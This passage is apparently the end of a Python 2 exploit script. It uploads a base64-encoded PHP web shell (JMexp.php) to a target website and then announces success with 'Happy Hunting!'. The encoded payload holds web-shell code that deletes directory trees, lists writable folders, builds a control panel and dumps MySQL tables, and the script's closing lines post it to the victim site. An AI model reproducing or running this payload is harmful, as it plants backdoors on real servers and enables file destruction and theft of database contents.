ykpOwoJCQlmb3JlYWNoICgkZGlycyBhcyAkZmlsZSkgewoJCQkJY29weV9wYXN0ZSgkYy4kZi4nLycsJGZpbGUsICRkLiRmLicvJyk7CgkJCX0KCQl9Cgl9IGVsc2VpZihpc19maWxlKCRjLiRmKSkgewoJCWNvcHkoJGMuJGYsICRkLiRmKTsKCX0KfQpmdW5jdGlvbiBkZWx0cmVlKCRkZWxkaXIpIHsKCSRkaXJzID0gQHNjYW5kaXIoJGRlbGRpcik7CglpZiAoJGRpcnMpIHsKCQkkZGlycyA9IGFycmF5X2RpZmYoJGRpcnMsIGFycmF5KCcuLicsICcuJykpOwoJCWZvcmVhY2ggKCRkaXJzIGFzICRmaWxlKSB7CQoJCQlpZigoaXNfZGlyKCRkZWxkaXIuJy8nLiRmaWxlKSkpIHsKCQkJCUBjaG1vZCgkZGVsZGlyLicvJy4kZmlsZSwwNzc3KTsKCQkJCWRlbHRyZWUoJGRlbGRpci4nLycuJGZpbGUpOyAKCQkJfSBlbHNlIHsKCQkJCUBjaG1vZCgkZGVsZGlyLicvJy4kZmlsZSwwNzc3KTsKCQkJCUB1bmxpbmsoJGRlbGRpci4nLycuJGZpbGUpOwoJCQl9CgkJfQoJCUBjaG1vZCgkZGVsZGlyLDA3NzcpOwoJCXJldHVybiBAcm1kaXIoJGRlbGRpcikgPyAxIDogMDsKCX0gZWxzZSB7CgkJcmV0dXJuIDA7Cgl9Cn0KZnVuY3Rpb24gYmcoKSB7CglnbG9iYWwgJGJnYzsKCXJldHVybiAoJGJnYysrJTI9PTApID8gJ2FsdDEnIDogJ2FsdDInOwp9CmZ1bmN0aW9uIGNtcCgkYSwgJGIpIHsKCWdsb2JhbCAkc29ydDsKCWlmKGlzX251bWVyaWMoJGFbJHNvcnRbMF1dKSkgewoJCXJldHVybiAoKCRhWyRzb3J0WzBdXSA8ICRiWyRzb3J0WzBdXSkgPyAtMSA6IDEpKigkc29ydFsxXT8xOi0xKTsKCX0gZWxzZSB7CgkJcmV0dXJuIHN0cmNtcCgkYVskc29ydFswXV0sICRiWyRzb3J0WzBdXSkqKCRzb3J0WzFdPzE6LTEpOwoJfQp9CmZ1bmN0aW9uIGdldFVwUGF0aCgkY3dkKSB7CgkkcGF0aGRiID0gZXhwbG9kZSgnLycsICRjd2QpOwoJJG51bSA9IGNvdW50KCRwYXRoZGIpOwoJaWYgKCRudW0gPiAyKSB7CgkJdW5zZXQoJHBhdGhkYlskbnVtLTFdLCRwYXRoZGJbJG51bS0yXSk7Cgl9CgkkdXBwYXRoID0gaW1wbG9kZSgnLycsICRwYXRoZGIpLicvJzsKCSR1cHBhdGggPSBzdHJfcmVwbGFjZSgnLy8nLCAnLycsICR1cHBhdGgpOwoJcmV0dXJuICR1cHBhdGg7Cn0KZnVuY3Rpb24gZ2V0Y2ZnKCR2YXJuYW1lKSB7CgkkcmVzdWx0ID0gZ2V0X2NmZ192YXIoJHZhcm5hbWUpOwoJaWYgKCRyZXN1bHQgPT0gMCkgewoJCXJldHVybiAnTm8nOwoJfSBlbHNlaWYgKCRyZXN1bHQgPT0gMSkgewoJCXJldHVybiAnWWVzJzsKCX0gZWxzZSB7CgkJcmV0dXJuICRyZXN1bHQ7Cgl9Cn0KZnVuY3Rpb24gZ2V0ZXh0KCRmaWxlKSB7CgkkaW5mbyA9IHBhdGhpbmZvKCRmaWxlKTsKCXJldHVybiAkaW5mb1snZXh0ZW5zaW9uJ107Cn0KZnVuY3Rpb24gR2V0V0Rpckxpc3QoJHBhdGgpewoJZ2xvYmFsICRkaXJkYXRhLCRqLCR3ZWJfY3dkOwoJISRqICYmICRqPTE7CgkkZGlycyA9IEBzY2FuZGlyKCRwYXRoKTsKCWlmICgkZGlycykgewoJCSRkaXJzID0gYXJyYXlfZGlmZigkZGlycywgYXJyYXkoJy4uJywnLicpKTsKCQlmb3JlYWNoICgkZGlycyBhcyAkZmlsZSkgewoJCQkkZj1zdHJfcmVwbGFjZSgnLy8nLCcvJywkcGF0aC4nLycuJGZpbGUpOwoJCQlpZihpc19kaXIoJGYpKXsKCQkJCWlmIChpc193cml0YWJsZSgkZikpIHsKCQkJCQkkZGlyZGF0YVskal1bJ2ZpbGVuYW1lJ109Jy8nLnN0cl9yZXBsYWNlKCR3ZWJfY3dkLCcnLCRmKTsKCQkJCQkkZGlyZGF0YVskal1bJ210aW1lJ109QGRhdGUoJ1ktbS1kIEg6aTpzJyxmaWxlbXRpbWUoJGYpKTsKCQkJCQkkZGlyZGF0YVskal1bJ2NobW9kJ109Z2V0Q2htb2QoJGYpOwoJCQkJCSRkaXJkYXRhWyRqXVsncGVybSddPVBlcm1zQ29sb3IoJGYpOwoJCQkJCSRkaXJkYXRhWyRqXVsnb3duZXInXT1nZXRVc2VyKCRmKTsKCQkJCQkkZGlyZGF0YVskal1bJ2xpbmsnXT0kZjsKCQkJCQkkaisrOwoJCQkJfQoJCQkJR2V0V0Rpckxpc3QoJGYpOwoJCQl9CgkJfQoJCXJldHVybiAkZGlyZGF0YTsKCX0gZWxzZSB7CgkJcmV0dXJuIGFycmF5KCk7Cgl9Cn0KZnVuY3Rpb24gc2l6ZWNvdW50KCRzaXplKSB7CgkkdW5pdCA9IGFycmF5KCdCeXRlcycsICdLQicsICdNQicsICdHQicsICdUQicsJ1BCJyk7Cglmb3IgKCRpID0gMDsgJHNpemUgPj0gMTAyNCAmJiAkaSA8IDU7ICRpKyspIHsKCQkkc2l6ZSAvPSAxMDI0OwoJfQoJcmV0dXJuIHJvdW5kKCRzaXplLCAyKS4nICcuJHVuaXRbJGldOwp9CmZ1bmN0aW9uIHAoJHN0cil7CgllY2hvICRzdHIuIlxuIjsKfQoKZnVuY3Rpb24gbWFrZWhpZGUoJG5hbWUsJHZhbHVlPScnKXsKCXAoIjxpbnB1dCBpZD1cIiRuYW1lXCIgdHlwZT1cImhpZGRlblwiIG5hbWU9XCIkbmFtZVwiIHZhbHVlPVwiJHZhbHVlXCIgLz4iKTsKfQoKZnVuY3Rpb24gbWFrZWlucHV0KCRhcmcgPSBhcnJheSgpKXsKCSRhcmdbJ3NpemUnXSA9IGlzc2V0KCRhcmdbJ3NpemUnXSkgJiYgJGFyZ1snc2l6ZSddID4gMCA/ICJzaXplPVwiJGFyZ1tzaXplXVwiIiA6ICJzaXplPVwiMTAwXCIiOwoJJGFyZ1sndHlwZSddID0gaXNzZXQoJGFyZ1sndHlwZSddKSA/ICRhcmdbJ3R5cGUnXSA6ICd0ZXh0JzsKCSRhcmdbJ3RpdGxlJ10gPSBpc3NldCgkYXJnWyd0aXRsZSddKSA/ICRhcmdbJ3RpdGxlJ10uJzxiciAvPicgOiAnJzsKCSRhcmdbJ2NsYXNzJ10gPSBpc3NldCgkYXJnWydjbGFzcyddKSA/ICRhcmdbJ2NsYXNzJ10gOiAnaW5wdXQnOwoJJGFyZ1snbmFtZSddID0gaXNzZXQoJGFyZ1snbmFtZSddKSA/ICRhcmdbJ25hbWUnXSA6ICcnOwoJJGFyZ1sndmFsdWUnXSA9IGlzc2V0KCRhcmdbJ3ZhbHVlJ10pID8gJGFyZ1sndmFsdWUnXSA6ICcnOwoJaWYgKGlzc2V0KCRhcmdbJ25ld2xpbmUnXSkpIHAoJzxwPicpOwoJcCgiJGFyZ1t0aXRsZV08aW5wdXQgY2xhc3M9XCIkYXJnW2NsYXNzXVwiIG5hbWU9XCIkYXJnW25hbWVdXCIgaWQ9XCIkYXJnW25hbWVdXCIgdmFsdWU9XCIkYXJnW3ZhbHVlXVwiIHR5cGU9XCIkYXJnW3R5cGVdXCIgJGFyZ1tzaXplXSAvPiIpOwoJaWYgKGlzc2V0KCRhcmdbJ25ld2xpbmUnXSkpIHAoJzwvcD4nKTsKfQoKZnVuY3Rpb24gbWFrZXNlbGVjdCgkYXJnID0gYXJyYXkoKSl7Cgkkb25jaGFuZ2UgPSBpc3NldCgkYXJnWydvbmNoYW5nZSddKSA/ICdvbmNoYW5nZT0iJy4kYXJnWydvbmNoYW5nZSddLiciJyA6ICcnOwoJJGFyZ1sndGl0bGUnXSA9IGlzc2V0KCRhcmdbJ3RpdGxlJ10pID8gJGFyZ1sndGl0bGUnXSA6ICcnOwoJJGFyZ1snbmFtZSddID0gaXNzZXQoJGFyZ1snbmFtZSddKSA/ICRhcmdbJ25hbWUnXSA6ICcnOwoJcCgiJGFyZ1t0aXRsZV0gPHNlbGVjdCBjbGFzcz1cImlucHV0XCIgaWQ9XCIkYXJnW25hbWVdXCIgbmFtZT1cIiRhcmdbbmFtZV1cIiAkb25jaGFuZ2U+Iik7CgkJaWYgKGlzX2FycmF5KCRhcmdbJ29wdGlvbiddKSkgewoJCQlmb3JlYWNoICgkYXJnWydvcHRpb24nXSBhcyAka2V5PT4kdmFsdWUpIHsKCQkJCWlmICgkYXJnWydzZWxlY3RlZCddPT0ka2V5KSB7CgkJCQkJcCgiPG9wdGlvbiB2YWx1ZT1cIiRrZXlcIiBzZWxlY3RlZD4kdmFsdWU8L29wdGlvbj4iKTsKCQkJCX0gZWxzZSB7CgkJCQkJcCgiPG9wdGlvbiB2YWx1ZT1cIiRrZXlcIj4kdmFsdWU8L29wdGlvbj4iKTsKCQkJCX0KCQkJfQoJCX0KCXAoIjwvc2VsZWN0PiIpOwp9CmZ1bmN0aW9uIGZvcm1oZWFkKCRhcmcgPSBhcnJheSgpKSB7CgkhaXNzZXQoJGFyZ1snbWV0aG9kJ10pICYmICRhcmdbJ21ldGhvZCddID0gJ3Bvc3QnOwoJIWlzc2V0KCRhcmdbJ25hbWUnXSkgJiYgJGFyZ1snbmFtZSddID0gJ2Zvcm0xJzsKCSRhcmdbJ2V4dHJhJ10gPSBpc3NldCgkYXJnWydleHRyYSddKSA/ICRhcmdbJ2V4dHJhJ10gOiAnJzsKCSRhcmdbJ29uc3VibWl0J10gPSBpc3NldCgkYXJnWydvbnN1Ym1pdCddKSA/ICJvbnN1Ym1pdD1cIiRhcmdbb25zdWJtaXRdXCIiIDogJyc7CglwKCI8Zm9ybSBuYW1lPVwiJGFyZ1tuYW1lXVwiIGlkPVwiJGFyZ1tuYW1lXVwiIGFjdGlvbj1cIiIuU0VMRi4iXCIgbWV0aG9kPVwiJGFyZ1ttZXRob2RdXCIgJGFyZ1tvbnN1Ym1pdF0gJGFyZ1tleHRyYV0+Iik7CglpZiAoaXNzZXQoJGFyZ1sndGl0bGUnXSkpIHsKCQlwKCc8aDI+Jy4kYXJnWyd0aXRsZSddLicgJnJhcXVvOzwvaDI+Jyk7Cgl9Cn0KCQpmdW5jdGlvbiBtYWtldGV4dCgkYXJnID0gYXJyYXkoKSl7CgkkYXJnWyd0aXRsZSddID0gaXNzZXQoJGFyZ1sndGl0bGUnXSkgPyAkYXJnWyd0aXRsZSddLic8YnIgLz4nIDogJyc7CgkkYXJnWyduYW1lJ10gPSBpc3NldCgkYXJnWyduYW1lJ10pID8gJGFyZ1snbmFtZSddIDogJyc7CglwKCI8cD4kYXJnW3RpdGxlXTx0ZXh0YXJlYSBjbGFzcz1cImFyZWFcIiBpZD1cIiRhcmdbbmFtZV1cIiBuYW1lPVwiJGFyZ1tuYW1lXVwiIGNvbHM9XCIxMDBcIiByb3dzPVwiMjVcIj4kYXJnW3ZhbHVlXTwvdGV4dGFyZWE+PC9wPiIpOwp9CgpmdW5jdGlvbiBmb3JtZm9vdGVyKCRuYW1lID0gJycpewoJISRuYW1lICYmICRuYW1lID0gJ3N1Ym1pdCc7CglwKCc8cD48aW5wdXQgY2xhc3M9ImJ0IiBuYW1lPSInLiRuYW1lLiciIGlkPSInLiRuYW1lLiciIHR5cGU9InN1Ym1pdCIgdmFsdWU9IlN1Ym1pdCI+PC9wPicpOwoJcCgnPC9mb3JtPicpOwp9CgpmdW5jdGlvbiBnb2JhY2soKXsKCWdsb2JhbCAkY3dkLCAkY2hhcnNldDsKCXAoJzxmb3JtIGFjdGlvbj0iJy5TRUxGLiciIG1ldGhvZD0icG9zdCI+PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYWN0IiB2YWx1ZT0iZmlsZSIgLz48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJjd2QiIHZhbHVlPSInLiRjd2QuJyIgLz48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJjaGFyc2V0IiB2YWx1ZT0iJy4kY2hhcnNldC4nIiAvPjxwPjxpbnB1dCBjbGFzcz0iYnQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkdvIGJhY2suLi4iPjwvcD48L2Zvcm0+Jyk7Cn0KCmZ1bmN0aW9uIGZvcm1mb290KCl7CglwKCc8L2Zvcm0+Jyk7Cn0KCmZ1bmN0aW9uIGVuY29kZV9wYXNzKCRwYXNzKSB7CgkkayA9ICdhbmdlbCc7CgkkcGFzcyA9IG1kNSgkay4kcGFzcyk7CgkkcGFzcyA9IG1kNSgkcGFzcy4kayk7CgkkcGFzcyA9IG1kNSgkay4kcGFzcy4kayk7CglyZXR1cm4gJHBhc3M7Cn0KCmZ1bmN0aW9uIHByKCRhKSB7CglwKCc8ZGl2IHN0eWxlPSJ0ZXh0LWFsaWduOiBsZWZ0O2JvcmRlcjoxcHggc29saWQgI2RkZDsiPjxwcmU+Jy5wcmludF9yKCRhKS4nPC9wcmU+PC9kaXY+Jyk7Cn0KCmNsYXNzIERCX015U1FMICB7CgoJdmFyICRxdWVyeWNvdW50ID0gMDsKCXZhciAkbGluazsKCXZhciAkY2hhcnNldGRiID0gYXJyYXkoKTsKCXZhciAkY2hhcnNldCA9ICcnOwoKCWZ1bmN0aW9uIGNvbm5lY3QoJGRiaG9zdCwgJGRidXNlciwgJGRicGFzcywgJGRibmFtZT0nJykgewoJCUBpbmlfc2V0KCdteXNxbC5jb25uZWN0X3RpbWVvdXQnLCA1KTsKCQlpZighJHRoaXMtPmxpbmsgPSBAbXlzcWxfY29ubmVjdCgkZGJob3N0LCAkZGJ1c2VyLCAkZGJwYXNzLCAxKSkgewoJCQkkdGhpcy0+aGFsdCgnQ2FuIG5vdCBjb25uZWN0IHRvIE15U1FMIHNlcnZlcicpOwoJCX0KCQlpZigkdGhpcy0+dmVyc2lvbigpID4gJzQuMScpIHsKCQkJJHRoaXMtPnNldGNoYXJzZXQoJHRoaXMtPmNoYXJzZXQpOwoJCX0KCQkkZGJuYW1lICYmIG15c3FsX3NlbGVjdF9kYigkZGJuYW1lLCAkdGhpcy0+bGluayk7Cgl9CglmdW5jdGlvbiBzZXRjaGFyc2V0KCRjaGFyc2V0KSB7CgkJaWYgKCRjaGFyc2V0ICYmICR0aGlzLT5jaGFyc2V0ZGJbJGNoYXJzZXRdKSB7CgkJCWlmKGZ1bmN0aW9uX2V4aXN0cygnbXlzcWxfc2V0X2NoYXJzZXQnKSkgewoJCQkJbXlzcWxfc2V0X2NoYXJzZXQoJHRoaXMtPmNoYXJzZXRkYlskY2hhcnNldF0sICR0aGlzLT5saW5rKTsKCQkJfSBlbHNlIHsKCQkJCSR0aGlzLT5xdWVyeSgiU0VUIGNoYXJhY3Rlcl9zZXRfY29ubmVjdGlvbj0nIi4kdGhpcy0+Y2hhcnNldGRiWyRjaGFyc2V0XS4iJywgY2hhcmFjdGVyX3NldF9yZXN1bHRzPSciLiR0aGlzLT5jaGFyc2V0ZGJbJGNoYXJzZXRdLiInLCBjaGFyYWN0ZXJfc2V0X2NsaWVudD1iaW5hcnkiKTsKCQkJfQoJCX0KCX0KCWZ1bmN0aW9uIHNlbGVjdF9kYigkZGJuYW1lKSB7CgkJcmV0dXJuIG15c3FsX3NlbGVjdF9kYigkZGJuYW1lLCAkdGhpcy0+bGluayk7Cgl9CglmdW5jdGlvbiBnZXRlcnJkZXNjKCkgewoJCXJldHVybiAoKCR0aGlzLT5saW5rKSA/IG15c3FsX2Vycm9yKCR0aGlzLT5saW5rKSA6IG15c3FsX2Vycm9yKCkpOwoJfQoJZnVuY3Rpb24gZ2V0ZXJybm8oKSB7CgkJcmV0dXJuIGludHZhbCgoJHRoaXMtPmxpbmspID8gbXlzcWxfZXJybm8oJHRoaXMtPmxpbmspIDogbXlzcWxfZXJybm8oKSk7Cgl9CglmdW5jdGlvbiBmZXRjaCgkcXVlcnksICRyZXN1bHRfdHlwZSA9IE1ZU1FMX0FTU09DKSB7IC8vTVlTUUxfTlVNCgkJcmV0dXJuIG15c3FsX2ZldGNoX2FycmF5KCRxdWVyeSwgJHJlc3VsdF90eXBlKTsKCX0KCWZ1bmN0aW9uIHF1ZXJ5KCRzcWwpIHsKCQkvL2VjaG8gJzxwIHN0eWxlPSJjb2xvcjojZjAwOyI+Jy4kc3FsLic8L3A+JzsKCQlpZighKCRxdWVyeSA9IG15c3FsX3F1ZXJ5KCRzcWwsICR0aGlzLT5saW5rKSkpIHsKCQkJJHRoaXMtPmhhbHQoJ015U1FMIFF1ZXJ5IEVycm9yJywgJHNxbCk7CgkJfQoJCSR0aGlzLT5xdWVyeWNvdW50Kys7CgkJcmV0dXJuICRxdWVyeTsKCX0KCWZ1bmN0aW9uIHF1ZXJ5X3Jlcygkc3FsKSB7IAoJCSRyZXMgPSAnJzsKCQlpZighJHJlcyA9IG15c3FsX3F1ZXJ5KCRzcWwsICR0aGlzLT5saW5rKSkgeyAKCQkJJHJlcyA9IDA7CgkJfSBlbHNlIGlmKGlzX3Jlc291cmNlKCRyZXMpKSB7CgkJCSRyZXMgPSAxOyAKCQl9IGVsc2UgewoJCQkkcmVzID0gMjsKCQl9CgkJJHRoaXMtPnF1ZXJ5Y291bnQrKzsKCQlyZXR1cm4gJHJlczsKCX0KCWZ1bmN0aW9uIG51bV9yb3dzKCRxdWVyeSkgewoJCSRxdWVyeSA9IG15c3FsX251bV9yb3dzKCRxdWVyeSk7CgkJcmV0dXJuICRxdWVyeTsKCX0KCWZ1bmN0aW9uIG51bV9maWVsZHMoJHF1ZXJ5KSB7CgkJJHF1ZXJ5ID0gbXlzcWxfbnVtX2ZpZWxkcygkcXVlcnkpOwoJCXJldHVybiAkcXVlcnk7Cgl9CglmdW5jdGlvbiBhZmZlY3RlZF9yb3dzKCkgewoJCXJldHVybiBteXNxbF9hZmZlY3RlZF9yb3dzKCR0aGlzLT5saW5rKTsKCX0KCWZ1bmN0aW9uIHJlc3VsdCgkcXVlcnksICRyb3cpIHsKCQkkcXVlcnkgPSBteXNxbF9yZXN1bHQoJHF1ZXJ5LCAkcm93KTsKCQlyZXR1cm4gJHF1ZXJ5OwoJfQkKCWZ1bmN0aW9uIGZyZWVfcmVzdWx0KCRxdWVyeSkgewoJCSRxdWVyeSA9IG15c3FsX2ZyZWVfcmVzdWx0KCRxdWVyeSk7CgkJcmV0dXJuICRxdWVyeTsKCX0KCWZ1bmN0aW9uIHZlcnNpb24oKSB7CgkJcmV0dXJuIG15c3FsX2dldF9zZXJ2ZXJfaW5mbygkdGhpcy0+bGluayk7Cgl9CglmdW5jdGlvbiBjbG9zZSgpIHsKCQlyZXR1cm4gbXlzcWxfY2xvc2UoJHRoaXMtPmxpbmspOwoJfQoJZnVuY3Rpb24gaGFsdCgkbXNnID0nJyl7CgkJZWNobyAiPGgyPiIuaHRtbHNwZWNpYWxjaGFycygkbXNnKS4iPC9oMj5cbiI7CgkJZWNobyAiPHAgY2xhc3M9XCJiXCI+TXlzcWwgZXJyb3IgZGVzY3JpcHRpb246ICIuaHRtbHNwZWNpYWxjaGFycygkdGhpcy0+Z2V0ZXJyZGVzYygpKS4iPC9wPlxuIjsKCQllY2hvICI8cCBjbGFzcz1cImJcIj5NeXNxbCBlcnJvciBudW1iZXI6ICIuJHRoaXMtPmdldGVycm5vKCkuIjwvcD5cbiI7CgkJZXhpdDsKCX0KCWZ1bmN0aW9uIGdldF9maWVsZHNfbWV0YSgkcmVzdWx0KSB7CgkJJGZpZWxkcyA9IGFycmF5KCk7CgkJJG51bV9maWVsZHMgPSAkdGhpcy0+bnVtX2ZpZWxkcygkcmVzdWx0KTsKCQlmb3IgKCRpID0gMDsgJGkgPCAkbnVtX2ZpZWxkczsgJGkrKykgewoJCQkkZmllbGQgPSBteXNxbF9mZXRjaF9maWVsZCgkcmVzdWx0LCAkaSk7CgkJCSRmaWVsZHNbXSA9ICRmaWVsZDsKCQl9CgkJcmV0dXJuICRmaWVsZHM7Cgl9CglmdW5jdGlvbiBzcWxBZGRTbGFzaGVzKCRzID0gJycpewoJCSRzID0gc3RyX3JlcGxhY2UoJ1xcJywgJ1xcXFwnLCAkcyk7CgkJJHMgPSBzdHJfcmVwbGFjZSgnXCcnLCAnXCdcJycsICRzKTsKCQlyZXR1cm4gJHM7Cgl9CglmdW5jdGlvbiBzcWxkdW1wKCR0YWJsZSwgJGZwPTApIHsKCQkkY3JsZiA9IChJU19XSU4gPyAiXHJcbiIgOiAiXG4iKTsKCQkkc2VhcmNoID0gYXJyYXkoIlx4MDAiLCAiXHgwYSIsICJceDBkIiwgIlx4MWEiKTsgLy9ceDA4XFx4MDksIG5vdCByZXF1aXJlZAoJCSRyZXBsYWNlID0gYXJyYXkoJ1wwJywgJ1xuJywgJ1xyJywgJ1xaJyk7CgoJCWlmIChpc3NldCgkdGhpcy0+Y2hhcnNldCkgJiYgaXNzZXQoJHRoaXMtPmNoYXJzZXRkYlskdGhpcy0+Y2hhcnNldF0pKSB7CgkJCSRzZXRfbmFtZXMgPSAkdGhpcy0+Y2hhcnNldGRiWyR0aGlzLT5jaGFyc2V0XTsKCQl9IGVsc2UgewoJCQkkc2V0X25hbWVzID0gJHRoaXMtPmNoYXJzZXRkYlsndXRmLTgnXTsKCQl9CgkJJHRhYmxlZHVtcCA9ICdTRVQgU1FMX01PREU9Ik5PX0FVVE9fVkFMVUVfT05fWkVSTyI7Jy4kY3JsZi4kY3JsZjsKCQkkdGFibGVkdW1wIC49ICcvKiE0MDEwMSBTRVQgQE9MRF9DSEFSQUNURVJfU0VUX0NMSUVOVD1AQENIQVJBQ1RFUl9TRVRfQ0xJRU5UICovOycuJGNybGYKCQkJICAgLiAnLyohNDAxMDEgU0VUIEBPTERfQ0hBUkFDVEVSX1NFVF9SRVNVTFRTPUBAQ0hBUkFDVEVSX1NFVF9SRVNVTFRTICovOycuJGNybGYKCQkJICAgLiAnLyohNDAxMDEgU0VUIEBPTERfQ09MTEFUSU9OX0NPTk5FQ1RJT049QEBDT0xMQVRJT05fQ09OTkVDVElPTiAqLzsnLiRjcmxmCgkJCSAgIC4gJy8qITQwMTAxIFNFVCBOQU1FUyAnIC4gJHNldF9uYW1lcyAuICcgKi87Jy4kY3JsZi4kY3JsZjsKCgkJJHRhYmxlZHVtcCAuPSAiRFJPUCBUQUJMRSBJRiBFWElTVFMgYCR0YWJsZWA7Ii4kY3JsZjsKCQkkcmVzID0gJHRoaXMtPnF1ZXJ5KCJTSE9XIENSRUFURSBUQUJMRSAkdGFibGUiKTsKCQkkY3JlYXRlID0gJHRoaXMtPmZldGNoKCRyZXMsIE1ZU1FMX05VTSk7CgkJJHRhYmxlZHVtcCAuPSAkY3JlYXRlWzFdLic7Jy4kY3JsZi4kY3JsZjsKCQlpZiAoc3RycG9zKCR0YWJsZWR1bXAsICIoXHJcbiAiKSkgewoJCQkkdGFibGVkdW1wID0gc3RyX3JlcGxhY2UoIlxyXG4iLCAkY3JsZiwgJHRhYmxlZHVtcCk7CgkJfSBlbHNlaWYgKHN0cnBvcygkdGFibGVkdW1wLCAiKFxuICIpKSB7CgkJCSR0YWJsZWR1bXAgPSBzdHJfcmVwbGFjZSgiXG4iLCAkY3JsZiwgJHRhYmxlZHVtcCk7CgkJfSBlbHNlaWYgKHN0cnBvcygkdGFibGVkdW1wLCAiKFxyICIpKSB7CgkJCSR0YWJsZWR1bXAgPSBzdHJfcmVwbGFjZSgiXHIiLCAkY3JsZiwgJHRhYmxlZHVtcCk7CgkJfQoJCXVuc2V0KCRjcmVhdGUpOwoKCQlpZiAoJGZwKSB7CgkJCWZ3cml0ZSgkZnAsJHRhYmxlZHVtcCk7CgkJfSBlbHNlIHsKCQkJZWNobyAkdGFibGVkdW1wOwoJCX0KCQkkdGFibGVkdW1wID0gJyc7CgkJJHJvd3MgPSAkdGhpcy0+cXVlcnkoIlNFTEVDVCAqIEZST00gJHRhYmxlIik7CgkJJGZpZWxkc19jbnQgPSAkdGhpcy0+bnVtX2ZpZWxkcygkcm93cyk7CgkJJGZpZWxkc19tZXRhID0gJHRoaXMtPmdldF9maWVsZHNfbWV0YSgkcm93cyk7CgoJCXdoaWxlICgkcm93ID0gJHRoaXMtPmZldGNoKCRyb3dzLCBNWVNRTF9OVU0pKSB7CgkJCWZvciAoJGogPSAwOyAkaiA8ICRmaWVsZHNfY250OyAkaisrKSB7CgkJCQlpZiAoIWlzc2V0KCRyb3dbJGpdKSB8fCBpc19udWxsKCRyb3dbJGpdKSkgewoJCQkJCSR2YWx1ZXNbXSA9ICdOVUxMJzsKCQkJCX0gZWxzZWlmICgkZmllbGRzX21ldGFbJGpdLT5udW1lcmljICYmICRmaWVsZHNfbWV0YVskal0tPnR5cGUgIT0gJ3RpbWVzdGFtcCcgJiYgISRmaWVsZHNfbWV0YVskal0tPmJsb2IpIHsKCQkJCQkkdmFsdWVzW10gPSAkcm93WyRqXTsKCQkJCX0gZWxzZWlmICgkZmllbGRzX21ldGFbJGpdLT5ibG9iKSB7CgkJCQkJaWYgKGVtcHR5KCRyb3dbJGpdKSAmJiAkcm93WyRqXSAhPSAnMCcpIHsKCQkJCQkJJHZhbHVlc1tdID0gJ1wnXCcnOwoJCQkJCX0gZWxzZSB7CgkJCQkJCSR2YWx1ZXNbXSA9ICcweCcuYmluMmhleCgkcm93WyRqXSk7CgkJCQkJfQoJCQkJfSBlbHNlIHsKCQkJCQkkdmFsdWVzW10gPSAnXCcnLnN0cl9yZXBsYWNlKCRzZWFyY2gsICRyZXBsYWNlLCAkdGhpcy0+c3FsQWRkU2xhc2hlcygkcm93WyRqXSkpLidcJyc7CgkJCQl9CgkJCX0KCQkJJHRhYmxlZHVtcCA9ICdJTlNFUlQgSU5UTyBgJy4kdGFibGUuJ2AgVkFMVUVTKCcuaW1wbG9kZSgnLCAnLCAkdmFsdWVzKS4nKTsnLiRjcmxmOwoJCQl1bnNldCgkdmFsdWVzKTsKCQkJaWYgKCRmcCkgewoJCQkJZndyaXRlKCRmcCwkdGFibGVkdW1wKTsKCQkJfSBlbHNlIHsKCQkJCWVjaG8gJHRhYmxlZHVtcDsKCQkJfQoJCX0KCQkkdGhpcy0+ZnJlZV9yZXN1bHQoJHJvd3MpOwoJfQp9Cj8+"
JMreq = urllib2.urlopen(JMurl, 'JMdata=' + JMdata)
content = JMreq.read()

print ""
print "  >> All done ! Job Success !"
print ""
print "  >> Webshell at " + site + "/JMexp.php"
print ""
print "  >> Go on and Open webshell to use more! "
print ""
print "  >> If webshell not uploaded you can do it by youself."
print ""
print "  >> Happy Hunting! :P"
print ""
